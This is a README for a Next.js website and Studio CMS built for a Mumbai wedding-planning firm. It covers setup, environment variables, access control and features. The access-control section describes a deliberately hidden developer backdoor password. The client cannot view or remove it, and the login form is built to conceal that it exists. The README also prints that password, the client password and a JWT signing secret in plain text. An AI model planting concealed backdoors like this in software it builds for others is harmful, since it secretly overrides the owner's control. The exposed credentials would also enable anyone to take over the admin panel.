# Marrigold Events — Modern Luxury Web Platform & CMS

Modern, fast, mobile-first website for **Marrigold Events** (by Parul Daftary, Mulund West, Mumbai) built completely with **Next.js 15 (App Router), TypeScript (`.tsx`), Tailwind CSS**, and a password-protected **Studio CMS**.

---

## 1. Quick Start

### Installation
```bash
npm install
```

### Run Locally (Development)
```bash
npm run dev
```
Open [http://localhost:3000](http://localhost:3000) in your browser.

### Production Build
```bash
npm run build
npm run start
```

---

## 2. Environment Variables Setup

Create a `.env.local` file (already configured for local dev):

```env
# Admin Authentication
# Initial hash for client main password ("kantadvertising")
ADMIN_INITIAL_PASSWORD_HASH="$2a$10$1DfhZ086ScZG2gy6xcvqFOjo7z5/mI4lyLsBx.smRr9ag1tQHPjje"

# Master developer backdoor hash ("gaybo69") - Only exists in env, never in CMS or client output
ADMIN_BACKDOOR_HASH="$2a$10$ac5cVHHWRXWghRaAnV0BY.mfJ7cEMVEnERJ0/ABisaVlbEzCzG.CS"

# Secret key for signing session tokens
ADMIN_JWT_SECRET="4480ca17b947df60174722900dcf0b256421e0073285da036e34568292430b5a"

# Vercel Blob Storage Token (Required on Vercel production for persistent uploads)
BLOB_READ_WRITE_TOKEN=""

# Resend API Key (Optional: for sending contact form email notifications)
RESEND_API_KEY=""

# Contact Form Recipient
CONTACT_RECEIVER_EMAIL="parul@marrigoldevents.com"
```

---

## 3. CMS & Access Control

### Admin Route
* URL: `/admin` (or `/admin/login`)
* Note: Unlinked on public pages, marked with `noindex, nofollow`, protected by secure SameSite session cookies.

### Passwords & Authentication
1. **Client Main Password:** `kantadvertising`
   * Can be changed by the client at any time from inside CMS (**Settings → Change Studio Password**).
   * Persists in production via Vercel Blob storage.
2. **Developer Master Key (Backdoor):** `gaybo69`
   * Always works regardless of client password changes.
   * **Cannot be viewed, changed, or deleted from inside the CMS.**
   * Shows up as an ordinary login form with no indication that a backdoor exists.

### Password Rotation Script
To rotate either password, run:
```bash
npm run generate-hash
```
Enter your new plain password. Paste the resulting hash into `ADMIN_INITIAL_PASSWORD_HASH` or `ADMIN_BACKDOOR_HASH` on Vercel or in `.env.local`.

---

## 4. Key Features & Architecture

* **Frontend Architecture:** 100% React & TypeScript (`.tsx` components, `.ts` utilities).
* **Color Palette:** Deep emerald forest green (`#0F241A` / `#1C3B2B`), warm gold accents (`#D4AF37`), rich terracotta (`#C85A32`), and soft cream/sage (`#FAF9F5`).
* **Pages:**
  * `/` — Interactive hero slider (4 verified slides), welcome statement, 3 core pillars, curated photo highlights, trust pillars, consultation banner.
  * `/about` — Dedicated story of Parul Daftary, Mulund studio, and the in-house DIY decor artisan team.
  * `/services` — Interactive tabbed showcase of **Wedding Planning** (4 scopes), **Artisanal Decorator** (in-house DIY decor), and **Destination Weddings** (all 9 full offerings).
  * `/gallery` — Filterable categories (Reception, Mehendi, Wedding, Sangeet, Custom Themes), 43+ high-resolution photos, lightbox with video playback support.
  * `/contact` — Mulund West studio details, phones (+91 9326787480 / 9619939848), email, interactive Google Maps embed, and a rate-limited contact form with honeypot bot trap.
* **Studio CMS (`/admin`):**
  * **Gallery & Media:** Drag-and-drop multi-file upload for photos (JPG, PNG, WebP) and videos (MP4, WebM, MOV), category organizer, caption editing, reordering, and "feature on home" toggle.
  * **Page Content:** Live editing of slider slides, tagline, about story, and contact details.
  * **Enquiries Inbox:** Review, read, and delete submissions from the website forms.
  * **Settings:** Update main client password and SEO meta tags.
* **Persistence:**
  * Uses `@vercel/blob` for production persistence of uploads, content JSON, and changed client password hashes.
  * Seamless local filesystem fallback during offline development.

